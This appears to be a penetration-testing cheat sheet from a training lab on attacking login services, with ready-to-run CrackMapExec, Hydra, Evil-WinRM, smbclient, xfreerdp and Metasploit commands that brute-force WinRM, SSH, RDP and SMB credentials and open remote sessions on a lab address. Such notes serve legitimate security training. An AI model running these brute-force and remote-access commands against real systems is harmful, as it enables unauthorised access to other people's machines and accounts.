
FTP
IMAP/POP3
RDP
Telnet
SMB
SSH
WinRM
SMTP
NFS
MySQL/MSSQL
VNC
LDAP

#### WinRM - Windows Remote Management
TCP 5985 (HTTP), 5986 (HTTPS)


#### CrackMapExec
```shell-session
sudo apt-get -y install crackmapexec
```
```shell-session
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
```shell-session
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```
```shell-session
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```
```shell-session
smbclient -U user \\\\10.129.42.197\\SHARENAME
```
#### NetExec
```shell-session
sudo apt-get -y install netexec
```

#### Evil-WinRM
```shell-session
sudo gem install evil-winrm
```
```shell-session
evil-winrm -i <target-IP> -u <username> -p <password>
```
```shell-session
evil-winrm -i 10.129.42.197 -u user -p password
```

#### Hydra - SSH
```shell-session
hydra -L user.list -P password.list ssh://10.129.42.197
```

#### Hydra - RDP
```shell-session
hydra -L user.list -P password.list rdp://10.129.42.197
```
```shell-session
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

Hydra - SMB
```shell-session
hydra -L user.list -P password.list smb://10.129.42.197
```

#### Metasploit
```shell-session
scanner/smb/smb_login
```

